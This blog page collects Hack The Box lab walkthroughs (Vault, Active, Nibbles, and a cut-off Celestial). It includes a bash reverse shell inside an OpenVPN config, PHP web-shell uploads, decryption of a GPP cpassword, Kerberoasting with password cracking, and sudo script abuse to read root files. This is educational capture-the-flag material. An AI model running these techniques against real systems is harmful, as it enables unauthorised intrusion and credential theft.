<!DOCTYPE html>
<html lang="en-us">

  <head>
  <link href="http://gmpg.org/xfn/11" rel="profile">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta http-equiv="content-type" content="text/html; charset=utf-8">

  <!-- Enable responsiveness on mobile devices-->
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">

  <title>
    
      Srbx7 &middot; Blog
    
  </title>

  <!-- CSS -->
  <link rel="stylesheet" href="/public/css/poole.css">
  <link rel="stylesheet" href="/public/css/syntax.css">
  <link rel="stylesheet" href="/public/css/blackdoc.css">
  <link rel="stylesheet" href="http://fonts.googleapis.com/css?family=PT+Sans:400,400italic,700|Abril+Fatface">
  <link rel="stylesheet" href="http://fonts.googleapis.com/css?family=EB+Garamond">
  <!-- Icons -->
  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/public/apple-touch-icon-144-precomposed.png">
  <link rel="shortcut icon" href="/public/favicon.ico">

  <!-- RSS -->
  <link rel="alternate" type="application/rss+xml" title="RSS" href="/atom.xml">
</head>


  <body>

    <div class="sidebar">
  <div class="container sidebar-sticky">
    <div class="sidebar-about">
      <h1>
        <a href="/">
          Srbx7
        </a>
      </h1>
      <p class="lead">My way of learning is to take notes by applying others' notes describe as functionnal.</p>
    </div>

    <nav class="sidebar-nav">
      <a class="sidebar-nav-item active" href="/">Walkthrough</a>

      

      
      
        
          
        
      
        
      
        
          
        
      
        
      
        
          
        
      

    </nav>
  </div>
</div>


    <div class="content container">
      <div class="posts">
  
  <div class="post">
    <h1 class="post-title">
      <a href="/offsec/2018/11/25/HTB-vault.html">
        Htb Vault
      </a>
    </h1>

    <span class="post-date">25 Nov 2018</span>

    <p><img src="/assets/images/vault.png" /></p>

<h1 id="vault-101010109">Vault: 10.10.10.109</h1>

<h1 id="recon">Recon:</h1>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 dirsearch.py -u 10.10.10.109 -e *

 _|. _ _  _  _  _ _|_    v0.3.8
(_||| _) (/_(_|| (_| )

Extensions: nmap | Threads: 10 | Wordlist size: 6040

Error Log: /home/srbz/git/tools/_web/dirsearch/logs/errors-18-11-13_02-07-01.log

Target: 10.10.10.109

[02:07:01] Starting: 
[02:07:04] 403 -  298B  - /.ht_wsr.txt
(...)
[02:07:50] 200 -  299B  - /index.php[02:07:50] 
[02:08:10] 200 -  299B  - /index.php/login/
(...)
Task Completed

</code></pre></div></div>

<p><img src="/assets/images/index_vault.png" style="width: 50%" /></p>

<p>After few minutes of searching and guessing, you should arrive at this login page.</p>

<p><img src="/assets/images/login_vault.png" style="width: 35%" /></p>

<blockquote>
  <p>Trying to pass this login page was not the solution. After a while I told my self, what if the index page is saying right for once. So kept enumerating and found new files.</p>
</blockquote>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 dirsearch.py -u http://10.10.10.109/sparklays/design -w common.txt -e html,php,txt -f

(...)
[20:18:43] 200 -   72B  - /sparklays/design/design.html
(...)
</code></pre></div></div>

<p>This page was giving access to a file upload module, but it had some extension restriction. Replacing the reverse PHP shell extension for <code class="highlighter-rouge">.php5</code> and that’s it, you got access to the ubuntu host as <code class="highlighter-rouge">www-data</code>.</p>

<h1 id="privesc">PrivEsc</h1>

<p>My first reflex was to check what services were reachable from the internal.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ netstat -tulpn
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:5902          0.0.0.0:*               LISTEN      -               
tcp        0      0 192.168.122.1:53        0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:5900          0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:5901          0.0.0.0:*               LISTEN      -               
tcp6       0      0 :::80                   :::*                    LISTEN      -               
tcp6       0      0 :::22                   :::*                    LISTEN      -               
tcp6       0      0 ::1:631                 :::*                    LISTEN      -               
udp        0      0 0.0.0.0:5353            0.0.0.0:*                           -               
udp        0      0 192.168.122.1:53        0.0.0.0:*                           -               
udp        0      0 0.0.0.0:67              0.0.0.0:*                           -               
udp        0      0 0.0.0.0:631             0.0.0.0:*                           -               
udp        0      0 0.0.0.0:58192           0.0.0.0:*                           -               
udp6       0      0 :::5353                 :::*                                -               
udp6       0      0 :::48208                :::*                                -   
</code></pre></div></div>

<p>Note that local IP adress <code class="highlighter-rouge">192.168.122.1:53</code> is on another network.</p>

<blockquote>
  <p>Since nmap was disabled for the <code class="highlighter-rouge">www-data</code> user, I try to run <code class="highlighter-rouge">socat</code> and <code class="highlighter-rouge">ncat</code> in order to be able to do port forwarding, but they wasn’t installed.</p>
</blockquote>

<p>Looking for something else, something like some broken files left on the desktop that would aloud you to pivote trough ssh! <code class="highlighter-rouge">#EPIC_FAIL</code></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>key
itscominghome

<span class="nb">cat</span> /home/dave/Desktop/ssh
dave
Dav3therav3123

<span class="nb">cat </span>Servers 
DNS + Configurator - 192.168.122.4
Firewall - 192.168.122.5
The Vault - x
</code></pre></div></div>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh -fNtD 9050 dave@10.10.10.109 [-L 127.0.0.1:8888:192.168.122.4:80]
proxychains firefox 192.168.122.4
</code></pre></div></div>

<p><img src="/assets/images/vault_vpn.jpg" style="width:30%" /></p>

<blockquote>
  <p>And it’s exactly at this moment when I received a call from Mom asking me what I was doing and I answered: Hmmmmm… not much, hacking VPN Mom.</p>
</blockquote>

<p>This <a href="https://medium.com/tenable-techblog/reverse-shell-from-an-openvpn-configuration-file-73fd8b1d38da">medium article</a> defines well what is what and how to pop a shell out of it!</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>remote 192.168.122.1
dev tun
nobind
script-security 2
up "/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.122.1/2323 0&gt;&amp;1'"
</code></pre></div></div>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat ssh
dave
dav3gerous567


cat user*
a4***************************3

</code></pre></div></div>

<blockquote>
  <p>At this point you could have change the root password and connect with ssh using these credentials and found alex’s <code class="highlighter-rouge">.bash_history</code> where you would have seen that he was pinging the <code class="highlighter-rouge">192.168.5.2</code> IP adress. But no chance, this adress was no longuer reachable.</p>
</blockquote>

<p>All the traffic to the Vault was passing trough the  <code class="highlighter-rouge">192.168.122.5</code> firewall. Bypassing firewall was easy. All you had to do was to add another IP adress to the same interface and remove this routing. Then, running a basic nmap scan on this target to unveil the <code class="highlighter-rouge">987/tcp</code> port wich was exposing a ssh service that were using the same cred then the DNS box.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@DNS:# route
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
10.200.0.1      *               255.255.255.255 UH    0      0        0 tun0
10.200.0.1      *               255.255.255.255 UH    0      0        0 tun1
10.200.0.1      *               255.255.255.255 UH    0      0        0 tun2
10.200.0.1      *               255.255.255.255 UH    0      0        0 tun3
10.200.0.1      *               255.255.255.255 UH    0      0        0 tun4
10.200.0.1      *               255.255.255.255 UH    0      0        0 tun5
192.168.5.0     192.168.122.5   255.255.255.0   UG    0      0        0 ens3
192.168.122.0   *               255.255.255.0   U     0      0        0 ens3

root@DNS:# ip address add 192.168.5.137/24 dev ens3
root@DNS:# route del -net 192.168.5.0 netmask 255.255.255.0 gw 192.168.122.5
root@DNS:# ping 192.168.5.2
PING 192.168.5.2 (192.168.5.2) 56(84) bytes of data.
64 bytes from 192.168.5.2: icmp_seq=1 ttl=64 time=1.56 ms
</code></pre></div></div>

<h1 id="welcome-to-the-vault">Welcome to the Vault!</h1>

<p>To complete the box, you had to <code class="highlighter-rouge">scp</code> the <code class="highlighter-rouge">root.txt.gpg</code> back to the ubuntu box and pass the key <code class="highlighter-rouge">itscominghome</code>.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>You need a passphrase to unlock the secret key for
user: "david &lt;dave@david.com&gt;"
4096-bit RSA key, ID D1EB1F03, created 2018-07-24 (main key ID 0FDFBFE4)

gpg: encrypted with 4096-bit RSA key, ID D1EB1F03, created 2018-07-24
      "david &lt;dave@david.com&gt;"
      gpg: .srb: unknown suffix
      Enter new filename [root.txt]: root.txt

cat root.txt 
ca4********************819
</code></pre></div></div>

  </div>
  
  <div class="post">
    <h1 class="post-title">
      <a href="/offsec/2018/10/21/HTB-active.html">
        Htb Active
      </a>
    </h1>

    <span class="post-date">21 Oct 2018</span>

    <p><img src="/assets/images/active.png" alt="" /></p>

<h1 id="active-101010100">Active 10.10.10.100</h1>

<h3 id="tools">Tools</h3>

<ul>
  <li>enum4linux</li>
  <li>smbclient</li>
  <li>gpocrack</li>
  <li>smbspider</li>
  <li>Impacket</li>
</ul>

<blockquote>
  <p><strong>TL;DR</strong></p>

  <p>Pwing a KDC by taking foothold with the cPassword identifiers found in an old GPO. It was impossible to execute commands, so I created paquets to get an arcfour (RC4) TGS for the CIFS service account and cracked the password. That gave me access as Administrator on this KDC.. game over!</p>
</blockquote>

<h4 id="scanning">Scanning</h4>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-oA</span> nmap/init 10.10.10.100
enum4linux <span class="nt">-a</span> 10.10.10.100
</code></pre></div></div>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Nmap 7.01 scan initiated Wed Sep 26 21:45:08 2018 as: nmap -sC -sV -oA nmap.init 10.10.10.100
Nmap scan report for 10.10.10.100
Host is up (0.13s latency).
Not shown: 983 closed ports
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Windows 2003 Kerberos (server time: 2018-09-27 01:45:37Z)
135/tcp   open  msrpc         Microsoft Windows RPC 
139/tcp   open  netbios-ssn   Microsoft Windows 98 netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0 
636/tcp   open  tcpwrapped
3268/tcp  open  ldap
3269/tcp  open  tcpwrapped
49152/tcp open  msrpc         Microsoft Windows RPC 
49153/tcp open  msrpc         Microsoft Windows RPC 
49154/tcp open  msrpc         Microsoft Windows RPC 
49155/tcp open  msrpc         Microsoft Windows RPC 
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0 
49158/tcp open  msrpc         Microsoft Windows RPC 
Service Info: OSs: Windows, Windows 98; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_server_2003, cpe:/o:microsoft:windows_98

Host script results:
|_smbv2-enabled: Server supports SMBv2 protocol

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Sep 26 21:46:43 2018 -- 1 IP address (1 host up) scanned in 94.85 seconds
</code></pre></div></div>

<h2 id="gainning-access">Gainning Access</h2>

<p>Enum4linux shows that Replication can be listed, so by browsing the directories you can easily find:</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ smbclient //10.10.10.100/Replication
smb: \&gt; cd active.htb
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\&gt; get Registry.pol
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\&gt; get Groups\Groups.xml
$ cat Groups\\Groups.xml 
<span class="cp">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span>
<span class="nt">&lt;Groups</span> <span class="na">clsid=</span><span class="s">"{3125E937-EB16-4b4c-9934-544FC6D24D26}"</span><span class="nt">&gt;</span>
	<span class="nt">&lt;User</span> 

		<span class="na">clsid=</span><span class="s">"{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}"</span> 
		<span class="na">name=</span><span class="s">"active.htb\SVC_TGS"</span> <span class="na">image=</span><span class="s">"2"</span> 
		<span class="na">changed=</span><span class="s">"2018-07-18 20:46:06"</span> 
		<span class="na">uid=</span><span class="s">"{EF57DA28-5F69-4530-A59E-AAB58578219D}"</span><span class="nt">&gt;</span>

		<span class="nt">&lt;Properties</span> 

			<span class="na">action=</span><span class="s">"U"</span> 
			<span class="na">newName=</span><span class="s">""</span> 
			<span class="na">fullName=</span><span class="s">""</span> 
			<span class="na">description=</span><span class="s">""</span> 
			<span class="na">cpassword=</span><span class="s">"edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"</span> 
			<span class="na">changeLogon=</span><span class="s">"0"</span> 
			<span class="na">noChange=</span><span class="s">"1"</span> 
			<span class="na">neverExpires=</span><span class="s">"1"</span> 
			<span class="na">acctDisabled=</span><span class="s">"0"</span> 
			<span class="na">userName=</span><span class="s">"active.htb\SVC_TGS"</span><span class="nt">/&gt;</span>
	<span class="nt">&lt;/User&gt;</span>
<span class="nt">&lt;/Groups&gt;</span>
</code></pre></div></div>

<p>Note the <a href="https://pentestlab.blog/tag/cpassword/">cPassword</a> in the XML file.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python gpocrack/gpocrack.py <span class="s1">'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'</span>
Password is: GPPstillStandingStrong2k18
</code></pre></div></div>

<blockquote>
  <p>Well, so far that’s all I have!</p>
</blockquote>

<ul>
  <li>User: SVC_TGS</li>
  <li>DOMAIN: active.htb</li>
  <li>Password=”GPPstillStandingStrong2k18”</li>
</ul>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient //10.10.10.100/Users -U=SVC_TGS%GPPstillStandingStrong2k18 
smb: \SVC_TGS\Desktop\&gt; get user.txt 
</code></pre></div></div>

<h2 id="privesc">PrivEsc:</h2>

<blockquote>
  <p>This box was not trivial. You couldn’t simply execute commands with CME. In addition, the new access on the SMB sharing with the identifiers found were a rabbit hole.</p>
</blockquote>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crackmapexec 10.10.10.100 -u SVC_TGS -p "GPPstillStandingStrong2k18" --shares  
CME          10.10.10.100:445 DC              [*] Windows 6.1 Build 7601 (name:DC) (domain:ACTIVE)
CME          10.10.10.100:445 DC              [+] ACTIVE\SVC_TGS:GPPstillStandingStrong2k18 
CME          10.10.10.100:445 DC              [+] Enumerating shares
CME          10.10.10.100:445 DC              SHARE           Permissions
CME          10.10.10.100:445 DC              -----           -----------
CME          10.10.10.100:445 DC              ADMIN$          NO ACCESS
CME          10.10.10.100:445 DC              IPC$            NO ACCESS
CME          10.10.10.100:445 DC              SYSVOL          READ
CME          10.10.10.100:445 DC              C$              NO ACCESS
CME          10.10.10.100:445 DC              Replication     READ
CME          10.10.10.100:445 DC              NETLOGON        READ
CME          10.10.10.100:445 DC              Users           READ
</code></pre></div></div>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">smbspider</span><span class="o">.</span><span class="n">py</span> <span class="o">-</span><span class="n">u</span> <span class="n">SVC_TGS</span> <span class="o">-</span><span class="n">p</span> <span class="n">GPPstillStandingStrong2k18</span> <span class="o">-</span><span class="n">h</span> <span class="mf">10.10.10.100</span> <span class="o">-</span><span class="n">s</span> <span class="n">Users</span>

 <span class="o">********************************************************</span>
 <span class="o">*</span>     		        <span class="n">_</span>     				<span class="o">*</span>
 <span class="o">*</span>    		       <span class="o">|</span> <span class="o">|</span>       <span class="o">//</span>  \\			<span class="o">*</span> 
 <span class="o">*</span>	  <span class="n">___</span> <span class="n">_</span> <span class="n">__</span> <span class="n">___</span> <span class="o">|</span> <span class="o">|</span><span class="n">__</span>    <span class="n">_</span>\\<span class="p">()</span><span class="o">//</span><span class="n">_</span>		<span class="o">*</span>
 <span class="o">*</span>	 <span class="o">/</span> <span class="n">__</span><span class="o">|</span> <span class="s">'_ ` _ </span><span class="err">\</span><span class="s">| '</span><span class="n">_</span> \  <span class="o">/</span> <span class="o">//</span>  \\ \ 		<span class="o">*</span>
 <span class="o">*</span>	 \<span class="n">__</span> \ <span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span><span class="n">_</span><span class="p">)</span> <span class="o">|</span>   <span class="o">|</span>\<span class="n">__</span><span class="o">/|</span>			<span class="o">*</span>
 <span class="o">*</span>	 <span class="o">|</span><span class="n">___</span><span class="o">/</span><span class="n">_</span><span class="o">|</span> <span class="o">|</span><span class="n">_</span><span class="o">|</span> <span class="o">|</span><span class="n">_</span><span class="o">|</span><span class="n">_</span><span class="o">.</span><span class="n">__</span><span class="o">/</span>				<span class="o">*</span>
 <span class="o">*</span>							<span class="o">*</span>
 <span class="o">*</span> <span class="n">SMB</span> <span class="n">Spider</span> <span class="n">v2</span><span class="mf">.4</span><span class="p">,</span> <span class="n">Alton</span> <span class="n">Johnson</span> <span class="p">(</span><span class="n">alton</span><span class="o">.</span><span class="n">jx</span><span class="o">@</span><span class="n">gmail</span><span class="o">.</span><span class="n">com</span><span class="p">)</span> 	<span class="o">*</span>
 <span class="o">********************************************************</span>

 <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Spidering</span> <span class="mi">1</span> <span class="n">system</span><span class="p">(</span><span class="n">s</span><span class="p">)</span><span class="o">...</span>

<span class="o">-----</span>
<span class="n">Completed</span> <span class="ow">in</span><span class="p">:</span> <span class="mf">46.9</span><span class="n">s</span>

</code></pre></div></div>

<p>With the SVC_TGS service’s credentials, it’s possible to ask kerberos for more; Request a legitimate TGT and which service(s) this account can use. Although it’s not possible to execute commands as SVC_TGS with CME nor MimiKatz, it’s to create packets with <a href="https://github.com/SecureAuthCorp/impacket">impacket </a> similarly to execute <code class="highlighter-rouge">ps&gt; klist</code> on the machine, for example. This would give the name(s) of the (SPNs) service principal name(s) to which the SVC_TGS account has access.</p>

<p>Then, with a SPN and a TGT, creating a TGS-REQ to Kerberos is now possible. The great thing about a TGS is that it allows you to crack the service’s password offline. Yeah! ;)</p>

<p><img src="/assets/images/impacket_GetUserSPNs.png" style="height: 100%; width: auto" /></p>

<p>Here we see that before requesting the TGS for a particular SPN, Impacket makes an (AS_REQ) Authentication Server Request and that the server responds with the TGT for this SVC_TGS service account. <strong>Note that the krbtgt doesn’t use the same encryption that the following TGS.</strong></p>

<p><img src="/assets/images/AS_REQ.png" style="height: 100%; width: auto" /></p>

<p>Then Impacket makes a TGS request that includes TGT information. Finally, the server responds with a TGS and Impacket format it in <code class="highlighter-rouge">krb5tgs</code> which is recognized by JTR and HC.</p>

<p><img src="/assets/images/TGS_REQ.png" style="height: 100%; width: auto" /></p>

<p><img src="/assets/images/kdc.png" style="height: 100%; width: auto" /></p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$krb5tgs$<span class="nt">&lt;ENCRYPTION_TYPE&gt;</span>$*<span class="nt">&lt;USERNAME&gt;</span>$<span class="nt">&lt;REALM&gt;</span>$<span class="nt">&lt;SPN&gt;</span>*$<span class="nt">&lt;FIRST_16_BYTES_TICKET&gt;</span>$<span class="nt">&lt;REMAINING_TICKET_BYTES&gt;</span>
</code></pre></div></div>

<p><img src="/assets/images/krb5tgs.png" style="height: 100%; width: auto" /></p>

<p>With a TGS, we can retrieve the Service’s password. If you run Kali, you will need to follow these steps for JTR to recognize the format.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://github.com/magnumripper/JohnTheRipper.git &amp;&amp; cd JohnTheRipper/src
./configure
make &lt;foo&gt; # &lt;-- see the line of the configure ^
cd ../run
./john --test
</code></pre></div></div>

<p>And then, voilà :)</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ./john /usr/share/wordlists/rockyou.txt tgs.txt # DON'T use --format=krb5tgs
</code></pre></div></div>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./john --wordlist=rockyou.txt ~/documents/CTFs/OSCP/HTB/10.10.10.100/CIFS.krb5tgs
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:06 59.23% (ETA: 18:42:03) 0g/s 1421Kp/s 1421Kc/s 1421KC/s donmegaa..donisayangalia
Ticketmaster1968 (?)
1g 0:00:00:07 DONE (2018-10-20 18:42) 0.1342g/s 1414Kp/s 1414Kc/s 1414KC/s Tiffani143..Thrall
Use the "--show" option to display all of the cracked passwords reliably
Session completed

./john --wordlist=~/rockyou.txt ~/documents/CTFs/OSCP/HTB/10.10.10.100/CIFS.krb5tgs
$ ./git/tools/JohnTheRipper/run/john --show ./documents/CTFs/OSCP/HTB/10.10.10.100/CIFS.krb5tgs 
?:Ticketmaster1968

1 password hash cracked, 0 left
</code></pre></div></div>

<p><img src="/assets/images/active_root.png" style="height: 100%; width: auto" /></p>

  </div>
  
  <div class="post">
    <h1 class="post-title">
      <a href="/offsec/2018/09/24/HTB-nibbles.html">
        Htb Nibbles
      </a>
    </h1>

    <span class="post-date">24 Sep 2018</span>

    <p><img src="/assets/images/nibbles.png" alt="banner" /></p>
<h1 id="nibbles-10101075">Nibbles: 10.10.10.75</h1>

<h2 id="scanning">Scanning:</h2>

<p><br /></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap 10.10.10.75

Starting Nmap 7.01 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2018-05-05 19:14 EDT
Nmap scan report <span class="k">for </span>10.10.10.75
Host is up <span class="o">(</span>0.11s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>21.39 seconds
</code></pre></div></div>

<p><br /></p>

<h2 id="gaining-access">Gaining Access:</h2>

<p><br /></p>

<p>As always, let’s start exploring the HTTP application running on port 80.</p>

<p>Well, nothing interesting there.. Let’s use <a href="https://tools.kali.org/web-applications/dirb">dirb</a> to bruteforce all common known directories as so <code class="highlighter-rouge">dirb 10.10.10.75/nibbleblog/</code></p>

<p><strong>Note: I created a function for calling dirb:</strong></p>

<p><em>~/.zshrc</em></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dirb<span class="o">(){</span>
    <span class="nb">echo</span> <span class="s1">'HTTPS'</span>
    <span class="nb">echo</span>
    /home/srbz/._bin/dirb/dirb https://<span class="nv">$1</span> /home/srbz/._bin/dirb/wordlists/common.txt
    <span class="nb">echo</span> <span class="s1">'HTTP'</span>
    <span class="nb">echo</span>
    /home/srbz/._bin/dirb/dirb http://<span class="nv">$1</span> /home/srbz/._bin/dirb/wordlists/common.txt
<span class="o">}</span>
</code></pre></div></div>

<p>Apparently, there’s no other way to login than guessing. Hack the box usually use the challenge name as the password.</p>

<p><code class="highlighter-rouge">username: admin</code></p>

<p><code class="highlighter-rouge">password: nibbles</code></p>

<p><br /></p>

<h2 id="maintaining-access">Maintaining Access:</h2>

<p><br /></p>

<p>Once logged in, we can upload files by using the plugin<code class="highlighter-rouge">my_image.</code> The vulnerability of that plugin is that it does not verrify the file extension. So, I uploaded my <a href="https://github.com/KevinCarroll7737/tools/blob/master/shell.php">shell.php</a></p>

<p>By running <a href="https://github.com/KevinCarroll7737/tools/blob/master/linenum.sh">linEnum.sh</a>, I’ve been able to see fast and clearly which files the user <code class="highlighter-rouge">nibbler</code> had the control of.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash linenum.sh

<span class="o">(</span>...<span class="o">)</span>

utching Defaults entries <span class="k">for </span>nibbler on Nibbles:
    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin

User nibbler may run the following commands on Nibbles:
    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
</code></pre></div></div>

<p>Ok so we can use <code class="highlighter-rouge">/home/nibbler/personal/stuff/monitor.sh</code> with sudo without giving password. Let’s change what’s in this script.</p>

<p><br /></p>

<h2 id="covering-tasks">Covering Tasks:</h2>

<p><br /></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s1">'cat /root/root.txt &gt; /tmp/srbz.txt; chown nibbler:nibbler /tmp/srbz.txt; chmod 777 /tmp/srbz.txt'</span> <span class="o">&gt;</span>  /home/nibbler/personal/stuff/monitor.sh
<span class="nb">sudo</span> /home/nibbler/personal/stuff/monitor.sh
<span class="nb">cat</span> /tmp/srbz.txt
b6d745c0dfb6457c55591efc898ef88c
<span class="nb">cat</span> /home/nibbler/user.txt
b02ff32bb332deba49eeaed21152c8d8
</code></pre></div></div>

  </div>
  
  <div class="post">
    <h1 class="post-title">
      <a href="/offsec/2018/09/24/HTB-celestial.html">
        Htb Celestial
      </a>
    </h1>

    <span class="post-date">24 Sep 2018</span>

    <p><img src="/assets/images/celestial.png" alt="banner" /></p>

<h1 id="celestial-10101085">Celestial: 10.10.10.85</h1>

<h2 id="scanning">Scanning</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-p</span> 1-65535 <span class="nt">-sV</span> <span class="nt">-sS</span> <span class="nt">-T4</span> 10.10.10.85
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>srbz: 

Starting Nmap 7.01 <span class="o">(</span> https://nmap.org  <span class="o">)</span> at 2018-08-01 19:58 EDT
Warning: 10.10.10.85 giving up on port because retransmission cap hit <span class="o">(</span>6<span class="o">)</span><span class="nb">.</span>
Stats: 0:51:53 elapsed<span class="p">;</span> 0 hosts completed <span class="o">(</span>1 up<span class="o">)</span>, 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 99.99% <span class="k">done</span><span class="p">;</span> ETC: 20:50 <span class="o">(</span>0:00:00 remaining<span class="o">)</span>
Nmap scan report <span class="k">for </span>10.10.10.85
Host is up <span class="o">(</span>0.12s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 65491 closed ports, 43 filtered ports
PORT     STATE SERVICE VERSION

3000/tcp open  http    Node.js Express framework

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>3395.61 seconds
</code></pre></div></div>

<h4 id="burp">Burp</h4>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /favicon.ico HTTP/1.1

Host: 10.10.10.85:3000

User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0

Accept: */*

Accept-Language: en-GB,en;q=0.5

Accept-Encoding: gzip, deflate

Cookie: profile=eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjIifQ%3D%3D

Connection: close

</code></pre></div></div>

<p>Since this is HTTP, let’s try to decode the Cookie.profile as URL then Base64.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">{</span><span class="s2">"username"</span>:<span class="s2">"Dummy"</span>,<span class="s2">"country"</span>:<span class="s2">"Idk Probably Somewhere Dumb"</span>,<span class="s2">"city"</span>:<span class="s2">"Lametown"</span>,<span class="s2">"num"</span>:<span class="s2">"2"</span><span class="o">}</span>
</code></pre></div></div>

<h2 id="gaining-access">Gaining Access</h2>

<p>Untrusted data passed into unserialize() function  in node-serialize module can be exploited to achieve arbitrary code execution by passing a serialized JavaScript Object with an Immediately invoked function expression (IIFE).</p>

<p>Pseudo code Server.js</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">express</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'express'</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">cookieParser</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'cookie-parser'</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">escape</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'escape-html'</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">serialize</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'node-serialize'</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">app</span> <span class="o">=</span> <span class="nx">express</span><span class="p">();</span>
<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">cookieParser</span><span class="p">())</span>
 
